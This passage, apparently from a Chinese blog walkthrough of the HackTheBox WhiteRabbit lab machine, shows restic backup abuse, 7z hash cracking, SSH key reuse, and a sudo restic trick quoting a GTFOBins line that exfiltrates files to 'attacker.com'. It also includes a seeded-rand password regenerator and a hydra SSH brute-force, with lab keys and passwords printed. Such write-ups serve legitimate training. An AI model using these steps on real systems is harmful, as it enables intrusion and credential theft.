|\n+----+---------------------+------------------------------------------------------------------------------+\n| 1  | 2024-08-30 10:44:01 | \u003cspan class=\"hljs-built_in\"\u003euname\u003c/span\u003e -a                                                                     |\n| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |\n| 3  | 2024-08-30 11:58:36 | \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw \u003e .restic_passwd                       |\n| 4  | 2024-08-30 11:59:02 | \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -rf .bash_history                                                         |\n| 5  | 2024-08-30 11:59:47 | \u003cspan class=\"hljs-comment\"\u003e#thatwasclose                                                                |\u003c/span\u003e\n| 6  | 2024-08-30 14:40:42 | \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /home/neo/ \u0026#x26;\u0026#x26; /opt/neo-password-generator/neo-password-generator | passwd |\n+----+---------------------+------------------------------------------------------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eRestic\u003c/h2\u003e\n\u003cp\u003e可以看到使用restic来备份数据，密码也泄露了，所以我们直接恢复数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target ./bak\nenter password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e repository: \nrepository 5b26a938 opened (version 2, compression level auto)\n[0:08] 100.00%  5 / 5 index files loaded\nrestoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./bak\nSummary: Restored 5 files/dirs (572 B) \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0:07\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能得到一个\u003ccode\u003e7z\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nbob.7z\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压需要密码，开膛手就绪\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  7z2john bob.7z \u003e 7z_hash \nATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes\n \n⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash            \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])\nCost 1 (iteration count) is 524288 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 2 (padding size) is 3 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 3 (compression \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e) is 2 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 4 (data length) is 365 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 16 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n1q2w3e4r5t6y     (bob.7z)     \n1g 0:00:03:12 DONE (2025-04-07 05:49) 0.005185g/s 124.1p/s 124.1c/s 124.1C/s 241287..shanefilan\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003e1q2w3e4r5t6y\u003c/code\u003e ，进行解压\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n7z_hash  bob  bob.7z  bob.pub  config\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config             \nHost whiterabbit\n  HostName whiterabbit.htb\n  Port 2222\n  User bob\n ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e bob   \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC\nVwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w\nAAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE\nFMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=\n-----END OPENSSH PRIVATE KEY-----\n ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e bob.pub \nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eSSH\u003c/code\u003e私钥进行登录，默认端口需要密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob\nbob@10.10.11.63\u003cspan class=\"hljs-string\"\u003e's password: \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试 \u003ccode\u003e2222\u003c/code\u003e 端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob -p 2222\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'[10.10.11.63]:2222 ([10.10.11.63]:2222)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e[10.10.11.63]:2222\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the '\u003c/span\u003eunminimize\u003cspan class=\"hljs-string\"\u003e' command.\nLast login: Sun Apr  6 20:29:14 2025 from 10.10.14.118\nbob@ebdce80611e9:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - morpheus\u003c/h2\u003e\n\u003cp\u003e寻找\u003ccode\u003euser.txt\u003c/code\u003e ,没找到，那么还需要操作..\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efind / -name user.txt 2\u003e/dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限，可以以\u003ccode\u003eRoot\u003c/code\u003e权限执行\u003ccode\u003erestic\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebob@ebdce80611e9:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e bob on ebdce80611e9:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser bob may run the following commands on ebdce80611e9:\n    (ALL) NOPASSWD: /usr/bin/restic\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ca href=\"https://gtfobins.github.io/gtfobins/restic/\"\u003ehttps://gtfobins.github.io/gtfobins/restic/\u003c/a\u003e 能找到利用方法，获取文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 利用方法\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e restic backup -r \u003cspan class=\"hljs-string\"\u003e\"rest:http://\u003cspan class=\"hljs-variable\"\u003e$RHOST\u003c/span\u003e:\u003cspan class=\"hljs-variable\"\u003e$RPORT\u003c/span\u003e/\u003cspan class=\"hljs-variable\"\u003e$NAME\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LFILE\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e restic init -r /tmp/bak\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e restic backup -r \u003cspan class=\"hljs-string\"\u003e\"/tmp/bak\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"/root\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e restic -r /tmp/bak dump latest /root \u003e data.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e data.txt\n....\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS\n1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP\nUtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx\nK0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w\nJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR\n4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp\nc3QBAg==\n-----END OPENSSH PRIVATE KEY-----                                                                     \nroot/morpheus.pub0000644000000000000000000000027214664326641014426 0ustar00rootroot00000000000000ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+wJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR4= morpheus@whiterabbit.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将私钥保存为\u003ccode\u003emorpheus\u003c/code\u003e后使用私钥进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  ssh morpheus@10.10.11.63 -i morpheus\nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e into.\n\nTo restore this content, you can run the \u003cspan class=\"hljs-string\"\u003e'unminimize'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Apr 7 10:23:46 2025 from 10.10.16.14\nmorpheus@whiterabbit:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在当前目录下可以找到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emorpheus@whiterabbit:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n7b5da670be642bef9c6969e85ee2da7b\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - root\u003c/h2\u003e\n\u003cp\u003e在之前\u003ccode\u003eSQL\u003c/code\u003e注入的时候能发现这个，感觉和提权是有关的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /home/neo/ \u0026#x26;\u0026#x26; /opt/neo-password-generator/neo-password-generator | passwd \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行之后会生成一段密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emorpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator \nruJ8Eyc9ZAIYVqPfUXo9\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是密码还是不对的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh neo@10.10.11.63                 \nneo@10.10.11.63\u003cspan class=\"hljs-string\"\u003e's password: \nPermission denied, please try again.       \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将程序拉出来进行逆向（不会），使用好友的脚本\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e大概就是\u003cstrong\u003e获取当前时间\u003c/strong\u003e（精确到微秒），并将其结果保存在传入的 \u003ccode\u003estruct timeval\u003c/code\u003e 类型变量中。\u003c/p\u003e\n\u003cp\u003e然后使用时间戳（精度为毫秒）作为种子，调用 \u003ccode\u003egenerate_password\u003c/code\u003e 函数。这个表达式的含义是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003etv.tv_sec\u003c/code\u003e 是当前的秒数\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etv.tv_usec / 1000\u003c/code\u003e 是当前微秒数转为毫秒\u003c/li\u003e\n\u003cli\u003e所以 \u003ccode\u003e1000 * tv.tv_sec + tv.tv_usec / 1000\u003c/code\u003e 是一个当前时间的 \u003cstrong\u003e毫秒数\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这个数值被作为种子或参数传入 \u003ccode\u003egenerate_password\u003c/code\u003e 函数，可能用来生成基于时间的随机密码。\u003c/p\u003e\n\u003cp\u003e而他生成密码时的时间是\u003ccode\u003e2024-08-30 14:40:42\u003c/code\u003e ，所以我们可以将该时间\u003ccode\u003e/ 1000\u003c/code\u003e 作为种子，生成一系列密码，其中一个密码就是正确的\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport ctypes\nimport sys\n\n\u003cspan class=\"hljs-comment\"\u003e# 根据平台加载适当的C库。\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e sys.platform.startswith(\u003cspan class=\"hljs-string\"\u003e'linux'\u003c/span\u003e):\n    libc = ctypes.CDLL(\u003cspan class=\"hljs-string\"\u003e\"libc.so.6\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# Linux平台\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e sys.platform == \u003cspan class=\"hljs-string\"\u003e\"darwin\"\u003c/span\u003e:\n    libc = ctypes.CDLL(\u003cspan class=\"hljs-string\"\u003e\"libc.dylib\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# macOS平台\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e sys.platform.startswith(\u003cspan class=\"hljs-string\"\u003e'win'\u003c/span\u003e):\n    libc = ctypes.CDLL(\u003cspan class=\"hljs-string\"\u003e\"msvcrt.dll\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# Windows平台\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n    raise Exception(\u003cspan class=\"hljs-string\"\u003e\"不支持的操作系统平台\"\u003c/span\u003e)\n\ndef generate_password(seed):\n    charset = \u003cspan class=\"hljs-string\"\u003e\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 密码字符集\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 使用C库的srand()设置种子\u003c/span\u003e\n    libc.srand(seed)\n    password = []\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e _ \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(20):\n        \u003cspan class=\"hljs-comment\"\u003e# 调用C库的rand()生成随机数\u003c/span\u003e\n        r = libc.rand()\n        index = r % len(charset)  \u003cspan class=\"hljs-comment\"\u003e# 保证生成的索引在字符集长度范围内（62个字符）\u003c/span\u003e\n        password.append(charset[index])  \u003cspan class=\"hljs-comment\"\u003e# 添加字符到密码列表\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(password))  \u003cspan class=\"hljs-comment\"\u003e# 打印生成的密码\u003c/span\u003e\n\ndef main():\n    \u003cspan class=\"hljs-comment\"\u003e# 2024-08-30 14:40:42 UTC的Unix时间戳\u003c/span\u003e\n    base_time_sec = 1725028842\n    \u003cspan class=\"hljs-comment\"\u003e# 遍历该秒内的1000毫秒\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ms \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(1000):\n        seed = base_time_sec * 1000 + ms  \u003cspan class=\"hljs-comment\"\u003e# 生成种子，包含毫秒部分\u003c/span\u003e\n        generate_password(seed)  \u003cspan class=\"hljs-comment\"\u003e# 生成并打印密码\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    main()  \u003cspan class=\"hljs-comment\"\u003e# 运行主函数\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用后会生成密码字典，然后使用九头蛇爆破\u003ccode\u003eneo\u003c/code\u003e即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  python get_pass.py \u003e pass.txt                           \n ⚡ root@kali  ~/Desktop/test/whiterabbit  hydra -l neo -P pass.txt -Vv -t 12 10.10.11.63 ssh           \nHydra v9.5 (c) 2023 by van Hauser/THC \u0026#x26; David Maciejak - Please \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not use \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e military or secret service organizations, or \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n                                                                                                         \nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 07:16:27                   \n[WARNING] Many SSH configurations \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 1000 login tries (l:1/p:1000), ~84 tries per task\n[DATA] attacking ssh://10.10.11.63:22/                                                                   \n[VERBOSE] Resolving addresses ... [VERBOSE] resolving \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e                                           \n[INFO] Testing \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e password authentication is supported by ssh://neo@10.10.11.63:22                   \n[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj                           \n[STATUS] attack finished \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.63 (waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e children to complete tests)                   \n1 of 1 target successfully completed, 1 valid password found                                        \n[WARNING] Writing restore file because 1 final worker threads did not complete \u003cspan class=\"hljs-keyword\"\u003euntil\u003c/span\u003e end.           \n[ERROR] 1 target did not resolve or could not be connected                                          \n[ERROR] 0 target did not complete                                                                        \nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 07:17:34    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003eWBSxhWgfnMiclrV4dqfj\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e所有权限（哭）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  ssh neo@10.10.11.63                                                                       \nneo@10.10.11.63\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the '\u003c/span\u003eunminimize\u003cspan class=\"hljs-string\"\u003e' command.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Apr 7 11:01:53 2025 from 10.10.16.14\nneo@whiterabbit:~$ sudo -l\n[sudo] password for neo: \nMatching Defaults entries for neo on whiterabbit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser neo may run the following commands on whiterabbit:\n    (ALL : ALL) ALL\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eneo@whiterabbit:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /root/root.txt\n19ffb49812c4ca4f8273aab4bd9dd5e9\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e难，入口找了好久。没提示真没注意到Json文件还藏着SQL注入的信息，但是注入的时间也太长了。最后还是逆向分析（不会），突然发现HTB 上的 Linux靶机，在Hard难度上的基本都是逆向。\u003c/p\u003e","title":"HackTheBox - Season7-WhiteRabbit","date":"2025-04-07","updated":"2025-04-07","comments":true,"tags":["HackTheBox","Linux靶机","逆向分析","SQL注入","encrypt"],"categories":"靶机","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason7-WhiteRabbit"},"buildId":"I7RFF_hwjEIRgLZZuazsl","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>